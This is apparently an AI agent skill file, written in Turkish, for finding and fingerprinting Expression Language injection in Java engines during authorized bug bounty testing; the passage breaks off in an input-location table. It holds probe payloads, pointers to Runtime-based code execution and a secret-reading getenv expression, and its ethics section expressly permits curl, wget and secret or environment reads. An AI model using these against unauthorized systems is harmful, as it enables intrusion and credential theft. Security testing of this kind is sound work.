---
name: expression-language-testing
description: Expression Language (EL) Injection tespiti, fingerprinting, context detection, engine-specific exploitation ve raporlama için kapsamlı, tek parça test skill'i. OGNL, SpEL, Java EL/UEL, MVEL, JEXL, CEL, FEEL, DRL, Aviator/QLExpress dahil bilinen başlıca EL/expression motorlarını kapsar (kapsam dışı/özel bir motorla karşılaşılması "unknown engine" olarak geçerli bir sonuçtur, bkz. §8.3). Yalnızca yetkilendirilmiş bug bounty / pentest / CTF ortamlarında kullanılır.
---

# Expression Language (EL) Injection — Kapsamlı Test Skill'i (Tek Parça)

## 0. Amaç, Kapsam ve Güvenlik Sınırı

### 0.1 Kapsam

**Kapsam içi:** Expression Language (EL) Injection — tüm türleri
(reflected, blind, stored, indirect, out-of-band) ve tüm büyük EL
motoru aileleri: **Java EL / UEL** (JSP EL, JSF Unified EL),
**OGNL** (Object-Graph Navigation Language), **SpEL** (Spring
Expression Language), **MVEL** (MVFLEX Expression Language),
**JEXL** (Apache Commons JEXL), **CEL** (Common Expression
Language), **FEEL** (Friendly Enough Expression Language) ve DRL
(Drools Rule Language), ve niş ama gerçek dünyada karşılaşılan
motorlar: **Aviator**, **QLExpress**, **JUEL/JBoss EL**.

**Kapsam dışı:** SSTI (Server-Side Template Injection — ayrım aşağıda
§3.2'de detaylandırılmıştır), XSS (ayrım §3.1'de), SQLi, Command
Injection, CSTI (Client-Side Template Injection), ve genel "unsafe
attribute/property access" (EL motoru hiç devreye girmeden yapılan
düz reflection tabanlı obje erişimi — bkz. §6 Type Confusion). Java
Deserialization (ör. `ysoserial` gadget zincirleri) de kapsam
dışıdır — bazı EL motorları (özellikle OGNL/SpEL) deserialization
zincirlerinde bir bileşen olarak karşınıza çıkabilir, ama bu skill
yalnızca **EL ifadesinin doğrudan enjekte edildiği** senaryoları
kapsar, serileştirilmiş obje grafiklerini değil.

### 0.2 Etik / Güvenlik Sınırı

Testler yalnızca yetkilendirilmiş scope içinde yapılır. **Gerçekten
gerekli olan tek sınırlar:**
- Dosya/veri **silme veya değiştirme yok**.
- **Kalıcı** sistem/konfigürasyon değişikliği **yok**.
- **Reverse shell veya kalıcı C2 yok** (çoğu bug bounty programının
  açıkça yasakladığı bir sınırdır).
- Kasıtlı ağır **DoS yok**.
- Test **scope'un dışına sıçramaz** (başka müşteri/tenant verisine
  erişmek gibi).

**Bunların dışında kalan her şey serbesttir** — `id`, `whoami`, `curl`,
`wget`, `ping`, `sleep N` gibi yaygın kabul gören non-destructive PoC
komutları; scope içindeki hassas/ayrıcalıklı (admin) veriye erişimin
gösterilmesi; config/secret/env değişkeni okuma — bunlar bir bug bounty
raporunun "gerçek etkiyi kanıtlama" gereğinin normal ve beklenen
parçasıdır. Bu skill boyunca gereğinden fazla genelleşmiş "şunu da
yapma" kuralları **bilinçli olarak eklenmemiştir** — aşırı
kısıtlayıcılık gerçek zafiyetlerin kaçırılmasına (false negative) yol
açar. `${T(java.lang.System).getenv()}`, `#context.get('...')` gibi
çıktılar "side-effect-free" (kalıcı değişiklik yapmıyor) olsa da
otomatik "zararsız/safe" sayılmaz — hedefe göre gerçekten hassas bilgi
(secret key, credential, internal endpoint) sızdırabilirler; bu ayrım
§10 Confirmation/Impact bölümünde detaylandırılmıştır.

---

## 1. Genel Metodoloji Akışı

Bu section, skill'in **zorunlu execution contract'ıdır**. Agent önce
scope'u doğrular; ardından yalnızca elde edilen sinyale göre ilgili
layer'a geçer. Aşağıdaki sıra bir "her endpoint'te her şeyi çalıştır"
checklist'i değildir.

### 1.1 Layer modeli

```text
Layer 1 — Discovery / Source / Sink
   ↓
Layer 2 — Generic EL Injection Detection (motor bilinmeden)
   ↓
Layer 3 — Context Detection (payload nereye oturuyor)
   ↓
Layer 4 — Engine Fingerprinting (OGNL mü, SpEL mi, MVEL mi, ...)
   ↓
Layer 5 — Confirmation (bağımsız evidence ile doğrulama)
   ↓
Layer 6 — Impact Assessment / Reporting
```

Her layer, bir öncekinden gelen **sinyale** göre dallanır — sinyal
negatifse bir sonraki aday endpoint/parametreye geçilir, aynı layer'da
tekrar tekrar denenmez (bkz. §2 Duplicate önleme).

### 1.2 Signal → Decision → Action → Result

```text
Signal:    Aday endpoint/parametre tespit edildi (§2)
Decision:  Risk skoru eşik üstünde mi? (§2 Risk skoru tablosu)
Action:    Generic detection probe'u gönder (§5)
Result:    Evaluation evidence VAR → Context Detection'a geç (§6)
           Evaluation evidence YOK → sıradaki adaya geç
```

Bu döngü her aday için tekrarlanır. **Karar kayıt sözleşmesi:** Agent,
her denenen (endpoint, parametre, context, payload_family,
engine_hypothesis, evidence_category) 6'lısını bir state tablosunda
tutar (somut şema §2'de) — aynı kombinasyon tekrar denenmez. (Bu 6
alan **temel** şemadır; §2'de, execution koşulu farklıysa eklenen
opsiyonel bir 7. alan — `execution_context` — ayrıca açıklanır.)

### 1.3 Signal önceliği ve fail-safe

Çelişen sinyaller ortaya çıktığında (örn. bir probe pozitif, ardından
gelen bir negatif kontrol de pozitif — yani ayrım sağlamıyor) öncelik
şu sıradadır:
1. **Evaluation evidence + geçerli negatif kontrol** (§5.1) — en
   güvenilir.
2. **Error-signature tabanlı fingerprint** (§7) — ikinci güvenilir.
3. **Context/delivery sinyali** (§6) — yalnızca destekleyici.
4. **Timing** (§9.2) — en zayıf, tek başına confirmed sayılmaz.

Fail-safe kural: Belirsizlik durumunda **daha düşük** classification'a
düş (`confirmed` yerine `probable`, `probable` yerine `inconclusive`) —
asla belirsiz bir sinyali "confirmed" olarak yukarı yuvarlama.

### 1.4 Hızlı Referans Tablosu

| EL Motoru | Ekosistem | Birincil Delimiter | RCE Kapasitesi |
|---|---|---|---|
| Java EL / UEL | JSF (JSP, Java EE, Tomcat, GlassFish, WebLogic, WebSphere) | `${ }` / `#{ }` | `ELProcessor`/`ImportHandler` üzerinden var |
| OGNL | Struts2/WebWork, Confluence, Apache Camel (`ognl` language) | `%{ }` (Struts2 context'inde), çıplak ifade | `@java.lang.Runtime@` erişimiyle doğrudan var |
| SpEL | Spring Framework/Boot/Cloud/Security/Batch/Integration | `#{ }` (bean tanımı), `T(...)` | `T(java.lang.Runtime)` ile doğrudan var |
| MVEL | Drools, JBPM, OptaPlanner, Apache Camel (`mvel`) | çıplak ifade, `@{ }` bazı entegrasyonlarda | Reflection zinciriyle var |
| JEXL | Apache Commons JEXL, Camel (`jexl`), JMeter, Solr | çıplak ifade | `Class.forName` zinciriyle var |
| CEL | Kubernetes (admission/policy), Envoy, Firebase, GCP IAM | çıplak ifade (protobuf/JSON context) | **Yok** — sandbox'lı, side-effect-free tasarım |
| FEEL | Camunda DMN, Zeebe/Camunda 8 | çıplak ifade, `if...then...else` | **Yok (FEEL'in kendisinde)** — tasarım gereği side-effect-free, CEL'e benzer sandbox felsefesi. Ancak Camunda'nın `scriptFormat` alanı FEEL yerine Groovy/JUEL'e yönlendirebilir — bu durumda RCE o motorun profiline bağlıdır, FEEL'in değil (bkz. §12.7) |
| DRL | Drools kural motoru (Drools/jBPM/Camunda 7 BPMN service task) | tam rule-definition syntax (`when`/`then` blokları) | `then` bloğunda var — genelde MVEL veya Java dialect üzerinden (bkz. §12.4) |
| Aviator/QLExpress | Alibaba ekosistemi (Nacos, Dubbo, dahili sistemler) | çıplak ifade | Reflection zinciriyle var (sürüme göre kısıtlı) |

### 1.5 Payload Stage Model (P0–P6)

SSTI skill'indeki aynı olgunlaşma modeli, EL Injection'a birebir
uygulanır:

| Stage | Anlamı |
|---|---|
| P0 — reflection | Payload response'ta herhangi bir şekilde görünüyor mu |
| P1 — syntax | Motor delimiter'ı "tanıyor" mu (parse ediliyor mu) |
| P2 — evaluation | Gerçekten hesaplanıyor mu (aritmetik/boolean) |
| P3 — context | Payload doğru context'e (attribute/expression/statement) oturdu mu |
| P4 — object-discovery | Erişilebilir obje/metod/helper kümesi keşfedildi mi (`T()`, `@...@`, `getClass()` zincirleri) |
| P5 — capability | Network/dosya/komut çalıştırma kapasitesi doğrulandı mı (henüz tetiklenmeden) |
| P6 — impact | Gerçek etki tetiklendi (RCE/dosya okuma/OOB) |

**Kritik routing kuralı:** `T(java.lang.Math).PI`, `@java.lang.System@getProperty(...)`
gibi yalnızca **motor kimliğini doğrulayan** (P4 — object-discovery)
payload'lar, tek başına asla `confirmed` sınıflandırmasına
yükseltilmez — bunlar `evidence_category=fingerprint` olarak
kaydedilir (§2 state şeması), yalnızca hangi motor ailesiyle
uğraşıldığını daraltmak için kullanılır. `confirmed` için P2
(evaluation) + §1.3'teki negatif kontrol şartı ayrıca sağlanmalıdır;
bir P4 sonucunun kendiliğinden P2/P6'ya "yükselmesi" (agent'ın "motor
tipini doğruladım, o zaman injection da confirmed" çıkarımı yapması)
yanlış bir kısayoldur ve engellenmelidir.

### 1.6 Engine-Seviyesi Fallback Zinciri Örneği

```text
${6666*6666} çalışmadı
  → #{6666*6666} dene (JSF composite component context)
    → çalışmadı → %{6666*6666} dene (Struts2/OGNL context işareti)
      → çalışmadı → çıplak "6666*6666" dene (OGNL/MVEL/JEXL context'i
        delimiter'sız olabilir — bkz. §7)
        → çalışmadı → context detection'a geri dön (§6), belki payload
          yanlış context'e düşüyor (örn. bir JSON alanı, delimiter
          gerektirmeyen bir "expression" field'ı olabilir)
```

### 1.7 Prerequisite Gate — P5/P6 Payload'ları İçin Varsayılan Sıra (Guidance, Hard Block Değil)

**Varsayılan strateji:** P5 (capability) ve P6 (impact) seviyesindeki
payload'lar (RCE, dosya okuma, OOB) genelde önce P2 (evaluation)
kanıtı, ardından P4 (object-discovery — hangi sınıf/metotlara erişim
olduğu, `T(java.lang.Runtime)` erişilebilir mi, `Class.forName`
çağrılabiliyor mu vb.) doğrulandıktan sonra denenir. Bu sıralama
gereksiz risk (kalıcı etki, WAF ban'i) ve gereksiz request bütçesi
tüketimini önler, bu yüzden **varsayılan/tercih edilen** akış budur.

**Ama bu mutlak bir engel değildir — güçlü hedef-özel bir sinyal bu
sırayı esnetebilir/atlayabilir.** Gerçek dünyada P2 kanıtı hiç
görünür olmayabilir ama zafiyet yine de var olabilir, örneğin:
```text
- Expression tamamen blind çalışıyor (response'ta hiçbir evaluation
  izi yok, ama side-effect gözlemlenebilir — ör. timing, OOB)
- Context'e expose edilen bir helper objesi doğrudan network erişimine
  sahip (aritmetik/reflection kanıtı beklemeden doğrudan test edilebilir)
- Second-order/stored evaluation söz konusu (P2 farklı bir zaman/yerde
  gerçekleşiyor, ilk istekte hiç görünmez)
- Context, aritmetik sonucu render etmiyor ama bir side-effect'i
  (dosya yazma, e-posta gönderme) doğrudan gözlemlemek mümkün
```
Bu gibi durumlarda, P2/P4'ü atlayıp doğrudan P5/P6 denemek **meşrudur**
— önemli olan kural, bir olası zafiyetin yalnızca "önceki aşamada
beklenen sinyal gözlenmedi" diye terk edilmemesidir. Agent, standart
sırayı takip eder ama hedefin davranışı farklı bir yol öneriyorsa
kendi kararını verebilir; bu esneklik, false-negative riskini
azaltmak için kasıtlıdır.

---

## 2. Discovery & Risk Scoring

### Endpoint/parametre adayları nereden çıkarılır
- Recon sonuçları: canlı host listesi, JS bundle'ları, OpenAPI/Swagger,
  GraphQL introspection, Burp/proxy history.
- Teknoloji fingerprint (framework/CMS tespiti) → §13'teki
  Framework→engine tablosuyla eşleştirilerek hangi EL ailesine
  bakılacağı önceden daraltılır (bu eşleme **varsayılan**dır, kesin
  değildir).

### Yüksek öncelikli endpoint kategorileri (azalan risk sırası)
1. Arama/filtre/sıralama/formül alanları (`sort`, `filter`, `field`,
   `expr`, `expression`, `formula`, `query`, `orderBy`) — birçok
   framework bu tür alanları **doğrudan** bir EL motoruna besler
   (özellikle OGNL/SpEL tabanlı framework'lerde bu, klasik bir
   attack surface'tir).
2. Validasyon/business-rule motoru girdileri (Drools/JBPM kural
   tanımları, Camunda DMN/FEEL ifadeleri, dinamik "koşul" alanları).
3. Spring Data / Spring Security tabanlı **yetki ifadesi** alanları
   (`@PreAuthorize`, `@PostAuthorize` içine kullanıcı girdisinin
   dolaylı olarak karışabildiği admin/config panelleri).
4. Struts2/WebWork tabanlı eski kurumsal uygulamalarda parametre adı
   **kendisi** bir OGNL context anahtarı olarak kullanılabilir
   (`?debug=command&expression=...` gibi klasik parametreler).
5. JSF (JavaServer Faces) tabanlı uygulamalarda `javax.faces.*`
   parametreleri, ViewState/resource kütüphanesi parametreleri.
6. No-code/low-code iş akışı motorları (Camunda, Activiti, Alibaba
   dahili otomasyon araçları, kural motoru tabanlı SaaS ürünleri) —
   kullanıcı tanımlı "koşul"/"aksiyon" ifadeleri.
7. API Gateway / Service Mesh policy tanımları (Envoy/Istio CEL
   ifadeleri, Kubernetes admission webhook policy'leri) — genelde
   kullanıcı girdisi doğrudan değil, bir config/manifest üzerinden
   dolaylı olarak ulaşır (bkz. §11).
8. Log/monitoring/alerting kural tanımları (bazı APM/log araçları
   kullanıcı tanımlı "alert expression" alanları sunar).

### Yüksek öncelikli parametre adları

**Öncelik notu (precision katmanlaması — hiçbir katman ATLANMAZ, yalnızca
test SIRASINI belirler; Tier-3 bir parametre de mutlaka test edilir,
sadece Tier-1'den sonra):**

**Dürüst sınır ve kaçırma riskini sıfırlama seçeneği:** Katmanlama,
adayları eşit önceliklendirmenin **pratik olarak imkansız** olduğu
geniş/otomatik keşif taramaları için tasarlanmıştır (yüzlerce
parametreli bir API'de bir sıralama zorunludur). Ama bu, gerçek bir
tradeoff getirir: eğer aday sayısı çok fazlaysa VE genel bir zaman/
request kısıtı varsa, kuyruğun en sonundaki (Tier-4) bir aday'a sıra
hiç gelmeyebilir. Bu riski **tamamen ortadan kaldırmanın** yolu:
**kapsam biliniyor/sınırlıysa (ör. belirli birkaç endpoint, bilinen
bir test hesabı üzerinden manuel/yarı-manuel test — tipik bir Burp
MCP oturumu) katmanlama tamamen devre dışı bırakılabilir** — bu
durumda tüm adaylar eşit öncelikte, keşif sırasına göre (isim
listesindeki sıraya bakılmaksızın) test edilir. Katmanlama yalnızca
**büyük ölçekli, kaynak kısıtlı otomatik tarama** senaryosunda
gerçek bir fayda sağlar; küçük/odaklı bir hedefte hiçbir dezavantajı
yoktur ve devre dışı bırakılması önerilir.

**Wildcard/çoklu-host kapsam stratejisi (`*.example.com` gibi —
katmanlamanın kapatılamadığı ama kaçırma riskinin azaltılabildiği
asıl senaryo):** Bir wildcard kapsam, "küçük/odaklı" değildir —
onlarca/yüzlerce subdomain'in her birinde tüm parametreleri eşit
öncelikte taramak pratikte imkansızdır, bu yüzden katmanlamayı
kapatmak burada **doğru çözüm değildir**. Bunun yerine **aşamalı
(breadth-first → depth) bir strateji** kaçırma riskini önemli ölçüde
azaltır:
```text
FAZ 1 (genişlik) — TÜM subdomain'lerde, yalnızca Tier-1/1b isimleri
  + endpoint-kategori sinyali + düşük bir bütçeyle (ör. ~3-5 request/
  aday) hızlı bir tarama yapılır. Amaç: her yerde "düşük asılı meyve"yi
  erken yakalamak, hiçbir subdomain'e henüz derin bütçe harcamadan.

  **Bilinen zayıflık ve düzeltmesi — tamamen blind vakalar FAZ 1'i
  atlayabilir:** Düşük bütçeli FAZ 1, esas olarak **yansıyan/reflected**
  sinyalleri (marker+arithmetic response'ta görünür mü) yakalar.
  Tamamen blind bir EL injection (response'ta hiçbir iz bırakmayan,
  yalnızca OOB/timing ile kanıtlanabilen) bu bütçede **sinyal
  üretmeyebilir** ve o subdomain hiç FAZ 2'ye terfi etmeden atlanabilir
  — bu, wildcard senaryosunda gerçek bir kaçırma noktasıdır. Düzeltme:
  **her aday için** (her (endpoint, parametre) çifti için — subdomain
  başına tek bir tane DEĞİL, çünkü bir subdomain'de onlarca parametre
  olabilir ve yalnızca birine OOB göndermek yanlış parametreyi seçme
  riski taşır) aktif bütçeyi artırmayan **ucuz bir OOB probe'u**
  eklenir (`interactsh-client` zaten asenkron çalıştığı için — bkz.
  §9.3 — payload gönderilir, callback beklenmeden bir sonraki adaya
  geçilir; bu tek istek FAZ 1 bütçesinin dışında sayılır çünkü aktif
  bekleme gerektirmez, sadece bir HTTP isteği ekler). Her probe'un
  interactsh'in kendi ürettiği **benzersiz subdomain/token'ı**
  taşıdığından emin olunur (bkz. §9.3 correlation kuralı) — aksi
  halde onlarca eşzamanlı bekleyen probe arasında hangi callback'in
  hangi (endpoint, parametre) çiftinden geldiği belirsizleşir. Tüm
  bu OOB payload'ları tek bir interactsh log dosyasında toplanır.

FAZ 2 (derinlik) — FAZ 1'de HERHANGİ bir sinyal (zayıf bile olsa —
  ör. bir hata mesajı, beklenmedik bir response farkı, **veya FAZ 4'te
  gelen bir OOB callback**) veren subdomain'ler, tam Tier-1-4 + tam
  bütçeyle yeniden test edilir.

FAZ 3 (yüksek-değer hedefler) — Recon'da (ör. ana uygulama, admin
  panel, API gateway, auth servisi gibi) yüksek değerli olarak
  işaretlenen subdomain'ler, FAZ 1 sonucundan BAĞIMSIZ olarak
  doğrudan tam Tier-1-4 taramasına alınır — bu subdomain'ler "hiç
  sinyal vermedi" diye atlanmaz, çünkü etki potansiyelleri (impact)
  zaten yüksektir.

FAZ 4 (OOB log tarama — ZORUNLU son adım, "FAZ 3 bitti = kampanya
  bitti" YANILGISINA KARŞI açıkça ayrı bir faz olarak tutulur) —
  FAZ 1'de gönderilen TÜM OOB probe'larının interactsh log'u tek
  seferde taranır. Callback alınan her (endpoint, parametre) çifti
  için, FAZ 1/2/3'teki önceki sonucu ne olursa olsun (daha önce
  "safe"/"no_signal" olarak işaretlenmiş olsa bile) o aday FAZ 2'ye
  (tam test) gönderilir. Bu faz atlanırsa, FAZ 1'de gönderilen ama
  geç gelen (dakikalar/saatler sonra tetiklenen) callback'ler
  kalıcı olarak kaybolur — bu yüzden kampanya, tüm subdomain'ler
  FAZ 1/2/3'ten geçse bile, FAZ 4 açıkça yapılmadan "tamamlandı"
  sayılmaz.

FAZ 5 (coverage sweep — Tier-2/3/4'ün wildcard'da hiç test
  edilmeme riskine karşı ZORUNLU son adım) — Bu bölümün başındaki
  "hiçbir katman ATLANMAZ" ilkesi ile FAZ 1-4 arasında **gerçek bir
  çelişki** vardır: FAZ 1 yalnızca Tier-1/1b isimlerini test eder;
  bir subdomain FAZ 1'de sıfır sinyal üretirse (ne reflected ne OOB),
  o subdomain'in Tier-2/3/4 parametreleri **hiçbir fazda test
  edilmez** — "hiçbir katman atlanmaz" sözü bu durumda tutulmamış
  olur. FAZ 5 bunu düzeltir: FAZ 1-4'te hiç sinyal üretmemiş
  subdomain'ler için, Tier-2/3/4'ten **örneklenmiş, düşük-bütçeli**
  bir ikinci geçiş yapılır (ör. her subdomain'de Tier-2'den en
  yüksek-öncelikli 2-3 parametre + varsa Tier-3/4'ten 1-2 parametre,
  tam Tier-1/1b derinliğinde değil ama en azından tek seferlik bir
  marker+arithmetic probe ile). Bu, "hiç bakılmadı" ile "derinlemesine
  bakıldı" arasındaki boşluğu kapatan minimum bir güvence katmanıdır
  — kampanya, FAZ 5 bu şekilde tamamlanmadan "tüm katmanlar
  test edildi" diye raporlanamaz.
```
Bu strateji, "her yerde her şeyi test et" (pratikte imkansız) ile
"yalnızca birkaç subdomain'e derin bak" (çoğu subdomain'i tamamen
atlar) arasındaki en dengeli noktadır — hiçbir subdomain sıfır
test almaz (FAZ 1 herkese uygulanır), ama derin/pahalı test yalnızca
sinyal veren veya zaten değerli olan yerlere odaklanır.

**Oturumlar arası devamlılık (campaign state) — büyük wildcard
taramalarının tek oturumda bitmeyeceği gerçeğine karşı:** Onlarca/
yüzlerce subdomain'lik bir kapsam, muhtemelen tek bir agent
oturumunda (sınırlı context/turn sayısı) tamamlanamaz.

**Bu, Claude Code'un kendi `--resume`/`--continue` mekanizmasının
YERİNE değil, ONUN TAMAMLAYICISI olarak kullanılır** — Claude Code
zaten tüm konuşma geçmişini oturum bazında diskte tutar ve
`--resume`/`--continue` ile geri yüklenebilir, bu yüzden aynı proje
dizininde çalışmaya devam ediyorsan önce bunu kullanmalısın. Aşağıdaki
JSON checkpoint iki spesifik durumda ayrıca gereklidir: (1) çok uzun/
çok günlük bir kampanyada context **compaction** (sıkıştırma) ince
detayları (hangi 7'li kombinasyon test edildi, hangi OOB token hangi
subdomain'e gitti) özetleyip kaybedebilir — açık JSON bunu korur; (2)
kampanyayı farklı bir proje dizinine/makineye/agent'a **taşımak**
gerekirse, `--resume` yalnızca aynı proje dizininde çalıştığı için
JSON tek taşınabilir seçenektir.

Bunu "kaldığı yerde durup kayıp gitme" haline getirmemek için, agent
oturum sonunda (context/turn sınırına yaklaşıldığında, kullanıcı
tarafından durdurulduğunda, veya wildcard listesi bitmeden önce her
N subdomain'de bir) aşağıdaki **campaign state** özetini üretip
kullanıcıya sunmalıdır — bu özet, bir sonraki oturumun başında
agent'a geri yapıştırılarak **kaldığı yerden** devam edilmesini
sağlar:

```json
{
  "campaign": "*.example.com",
  "last_updated": "ISO-8601 zaman damgası",
  "faz4_completed": false,
  "faz5_completed": false,
  "subdomains": {
    "app.example.com":   {"phase": 2, "status": "confirmed", "finding_ref": "F-001"},
    "api.example.com":   {"phase": 1, "status": "no_signal"},
    "admin.example.com": {"phase": 3, "status": "in_progress"},
    "old.example.com":   {"phase": 0, "status": "not_started"}
  },
  "oob_pending": [
    {"subdomain": "api.example.com", "endpoint": "/search", "parameter": "filterExpression",
     "oob_token": "...", "sent_at": "..."}
  ],
  "duplicate_prevention_table": "bkz. §2 — bu oturumda test edilen tüm (endpoint, parameter, context, payload_family, engine_hypothesis, evidence_category, execution_context) 7'lileri"
}
```

**Faz kodları:** `0` = hiç başlanmadı, `1` = FAZ 1 (genişlik) tamamlandı,
`2` = FAZ 2'ye (derinlik) terfi etti, `3` = FAZ 3 (yüksek-değer,
zorunlu tam tarama) kapsamında, `5` = FAZ 5 (coverage sweep) bu
subdomain için tamamlandı (yalnızca FAZ 1'de sinyal üretmemiş
subdomain'lere uygulanır). `faz4_completed`/`faz5_completed` ise
subdomain bazlı değil, **kampanya genelinde** birer bayraktır — tüm
subdomain'ler FAZ 1/2/3'ten geçse bile bu bayraklardan biri `false`
kaldığı sürece kampanya
tamamlanmış sayılmaz.

**Devam ettirme kuralı:** Yeni oturumda bu JSON verildiğinde, agent:
1. `status: "confirmed"/"safe"` olan subdomain'lere **tekrar dokunmaz**
   (zaten sonuçlanmış).
2. `phase: 0/1` olanlara kaldığı fazdan devam eder — duplicate
   prevention tablosu sayesinde aynı probe'lar tekrar gönderilmez.
3. `oob_pending` listesindeki **her (endpoint, parametre) girdisi**
   için interactsh log'unu kontrol eder (callback geldiyse o spesifik
   aday, ait olduğu subdomain'in önceki fazından BAĞIMSIZ olarak FAZ
   2'ye terfi eder — bkz. FAZ 4; gelmediyse beklemeye devam eder ya
   da makul bir süre sonra "negatif" sayılır ve listeden çıkarılır).
4. Hiçbir subdomain, bu state olmadan "muhtemelen daha önce
   bakılmıştır" varsayımıyla atlanmaz — state açıkça `not_started`
   demiyorsa ve agent'ın kendi hafızasında/kanıtında bir iz yoksa,
   o subdomain FAZ 1'den başlatılır (kaybolan bir state, "test
   edilmemiş" olarak yorumlanır — "test edilip bulgu çıkmamış" olarak
   değil, çünkü bu varsayım yanlışsa gerçek bir bulgu sessizce
   kaybolur).
5. Kampanya, tüm subdomain'ler FAZ 1/2/3'ü geçmiş olsa bile
   `faz4_completed: false` ise **bitmemiş sayılır** — agent bir
   sonraki oturumda önce FAZ 4'ü (kalan `oob_pending` girdilerinin
   log kontrolü) tamamlamadan kampanyayı "sonuçlandı" olarak
   raporlayamaz.
6. Aynı şekilde `faz5_completed: false` ise, FAZ 1'de sinyal
   üretmemiş subdomain'lerin Tier-2/3/4 coverage sweep'i (yukarıdaki
   FAZ 5) tamamlanmadan kampanya "tüm katmanlar test edildi"
   iddiasıyla kapatılamaz.

**Katmanın kendisi de mutlak değil — düşük-tier bir isim yüksek
skorlu olabilir:** Unutulmamalı ki parametre adı, risk skorunun
**beş sinyalinden yalnızca biridir** (yukarıdaki Risk skoru tablosu:
isim +3, endpoint kategorisi +3, EL-hata sinyali +4, teknoloji
fingerprint +2, stored/indirect şüphesi +2). Tier-4'teki `value` gibi
bir parametre, response'ta bir EL-hata sinyali görülürse veya
teknoloji fingerprint'i Struts2/Spring'e işaret ediyorsa, tek başına
Tier-1'deki bir isimden **daha yüksek toplam skor** alabilir — yani
isim-tabanlı katman, tek belirleyici faktör değildir.

**Tier-1 — EL/expression çekirdek adları (en yüksek precision, genel):**
`expr`, `expression`, `el`, `elExpression`, `spel`, `spelExpression`,
`ognl`, `ognlExpression`, `mvel`, `mvelExpression`, `jexl`,
`jexlExpression`, `celExpression`, `condition`, `rule`,
`ruleExpression`, `formula`, `script`, `dsl`, `dslExpression`,
`scriptExpression`, `evaluationExpression`, `eval`, `evalExpression`,
`expressionLanguage`, `expressionValue`, `valueExpression`,
`calculationExpression`, `computedValue`, `derivedValue`,
`dynamicExpression`, `customExpression`

**Tier-1b — `...Expression`/`...Rule` sonek kalıbı (bu sonekle biten
alanlar, ismi ne olursa olsun geliştiricinin bilinçli olarak bir
ifade/kural motoruna bağladığının güçlü bir işaretidir, precision
Tier-1 ile eşdeğerdir):**
`filterExpression`, `queryExpression`, `authorizationExpression`,
`permissionExpression`, `validationExpression`, `templateExpression`,
`formatExpression`, `renderExpression`, `displayExpression`,
`visibilityExpression`, `redirectExpression`, `actionExpression`,
`eventExpression`, `triggerExpression`, `policyExpression`,
`securityExpression`, `mappingExpression`

**Tier-2 — Arama/filtre/sıralama (klasik OGNL/SpEL sink adayı, orta
precision — bu adlar hem gerçek sink hem framework-default-safe
parametre olabilir, bkz. §12.3 Spring Data notu):**
`filter`, `sort`, `field`, `attr`, `order_by`, `orderBy`, `predicate`,
`constraint`, `validator`, `transform`, `transformation`, `mapping`,
`selector`, `template`

**Tier-3 — Genel arama/sorgu adları (düşük precision, EL'e özgü
olmaktan çok genel amaçlı; yine de test edilir ama Tier-1/2 tükendikten
sonra, ve tek başına bir isim eşleşmesi tek bir test gerekçesi
sayılmaz — response/error/teknoloji sinyaliyle birlikte
değerlendirilmelidir):**
`search`, `query`, `q`, `keyword`, `term`, `criteria`

**Tier-4 — Genel web-parametre adları (EN DÜŞÜK precision — bu adlar
neredeyse her uygulamada geçer ve büyük çoğunlukla EL'le hiçbir
ilgisi yoktur; yalnızca teknoloji + response/error sinyaliyle
BİRLİKTE anlamlıdır, tek başına bir isim eşleşmesi neredeyse hiçbir
zaman test gerekçesi sayılmamalıdır — bu katman, kapsamı genişletmek
isteyen ama gürültüyü de kabul eden kapsamlı taramalar içindir):**
`value`, `input`, `parameter`, `property`, `attribute`, `message`,
`text`, `content`, `body`, `subject`, `title`, `description`, `label`,
`name`, `defaultValue`, `order`, `include`, `import`, `resource`,
`path`, `view`, `viewName`, `layout`, `format`, `display`, `url`,
`link`, `href`, `action`, `event`

**Business-rule/workflow (Drools/Camunda/JBPM — Tier-1 ile eşdeğer
precision, çünkü bu adlar EL-dışı bir bağlamda neredeyse hiç
kullanılmaz):**
`decisionExpression`, `feelExpression`, `ruleBody`,
`workflowCondition`, `gatewayCondition`, `gatewayExpression`,
`sequenceFlowCondition`, `businessRuleExpression`, `decisionRule`,
`workflowExpression`, `taskExpression`, `dueDate`
(Camunda'da `dueDate`/`followUpDate` alanları tarihsel EL ifadesi
kabul edebilir)

**Yetki/güvenlik ifadesi (Spring Security bağlamı):**
`accessExpression`, `authExpression`, `permission`, `role_expr`,
`securityRule`, `accessControl`, `policy`

**JSF/Java EE'ye özgü:**
`javax.faces.ViewState`, `javax.faces.resource`, `execute`, `render`

### Girdi konumu matrisi (parametre adı keşfi TEK BAŞINA yeterli değildir)

Yukarıdaki parametre adları yalnızca **isim** üzerinden bir öncelik
sıralaması verir; ama aynı isim, taşınma şekline göre çok farklı bir
sink davranışı gösterebilir (ör. bir JSON body içindeki `filter` alanı
ile aynı isimdeki bir HTTP header çok farklı parser/validation
zincirinden geçebilir). Bu yüzden her aday parametre, **konumuna göre**
ayrıca sınıflandırılmalı ve konuma özgü encoding/context notu
uygulanmalıdır:

**Kritik ek kural — bir konumdaki negatif sonuç diğerine aktarılamaz:**
Aynı `${...}` payload'ı hem query parametresinde hem JSON body'de
negatif dönebilir, ama **sebepleri tamamen farklı** olabilir — query'de
URL-decode katmanı `{`/`}` karakterlerini bozmuş olabilirken, JSON'da
string-escape kuralları payload'ı değiştirmiş olabilir; bunların
ikisi de "motor evaluate etmiyor" anlamına gelmez, yalnızca o
**konuma özgü bir encoding/parser sorunu** olabilir. Bu yüzden her
`input_location` için negatif sonuç, önce o konuma özgü encoding
sorunu olup olmadığı (§8 encoding/bypass teknikleri) elenerek
**ayrı ayrı** teşhis edilmelidir — bir konumdaki negatif sonuç,
motorun kendisi hakkında diğer konumlar için bir sonuç çıkarmaz.

```text
Konum                    Notlar
─────────────────────────────────────────────────────────────
Query string parametresi  En yaygın, en az transform katmanı
POST form (urlencoded)    Query ile benzer, ekstra decode katmanı yok
JSON scalar değer          Genelde parser en dıştan bir decode yapar;
                          JSON string escape kuralları payload'a uygulanır
JSON nested alan/array     Recursive keşif gerekir (bkz. aşağıdaki not)
XML element değeri         Bkz. §6'daki XML element/attribute context notu
XML attribute değeri       XML attribute escape kuralları farklıdır (§6)
HTTP header değeri         Genelde daha az filtrelenir (header'lar body
                          kadar sıkı validate edilmeyebilir) — özellikle
                          custom header'lar (ör. `X-Filter-Expression`)
                          düşük-görünürlüklü ama yüksek-olasılıklı
                          sink adaylarıdır
Cookie değeri              Header'a benzer, ayrıca genelde loglara
                          daha az yansır (blind/OOB testi öncelikli)
Path parametresi (segment) Genelde routing'den geçtiği için ekstra
                          bir URL-decode katmanı olabilir
Multipart form field       Content-Type'a bağlı ekstra parse katmanı
